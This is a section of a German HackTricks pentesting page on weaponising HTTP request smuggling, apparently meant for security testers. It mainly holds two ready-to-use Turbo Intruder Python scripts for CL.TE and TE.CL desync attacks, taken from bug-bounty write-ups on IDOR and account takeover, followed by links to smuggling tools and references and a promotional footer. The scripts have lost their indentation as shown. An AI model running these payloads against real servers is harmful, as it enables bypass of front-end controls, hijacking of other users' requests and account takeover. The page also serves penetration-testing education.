### Bewaffnung von HTTP-Request-Smuggling mit HTTP-Response-Desynchronisation

Haben Sie eine HTTP-Request-Smuggling-Schwachstelle gefunden und wissen nicht, wie Sie sie ausnutzen k√∂nnen? Versuchen Sie diese andere Methode der Ausnutzung:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo-Intruder-Skripte

### CL.TE

Von [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Von: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Werkzeuge

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Dieses Tool ist ein auf Grammatik basierender HTTP Fuzzer, der n√ºtzlich ist, um seltsame Anomalien beim Request-Smuggling zu finden.

## Referenzen

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
